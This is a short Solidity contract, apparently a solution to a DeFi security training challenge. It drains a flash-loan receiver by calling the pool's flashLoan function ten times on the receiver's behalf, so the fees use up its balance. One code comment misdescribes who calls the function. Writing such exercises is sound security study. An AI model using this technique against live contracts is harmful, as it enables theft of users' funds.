// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {Address} from "openzeppelin-contracts/utils/Address.sol";
import "forge-std/console.sol";

/**
 * @title Exploit
 * @author @dec3ntraliz3d
 */

interface INaiveReceiverLenderPool {
    function flashLoan(address, uint256) external;
}

contract Exploit {
    address public poolAddress;
    address public borrowerAddress;

    constructor(address _poolAddress, address _borrowerAddress) {
        poolAddress = _poolAddress;
        borrowerAddress = _borrowerAddress;
    }

    // Function called by the pool during flash loan
    function exploit() public {
        for (uint256 i = 0; i < 10; i++) {
            INaiveReceiverLenderPool(poolAddress).flashLoan(
                borrowerAddress,
                1e18
            );
            console.log(borrowerAddress.balance);
        }
    }
}
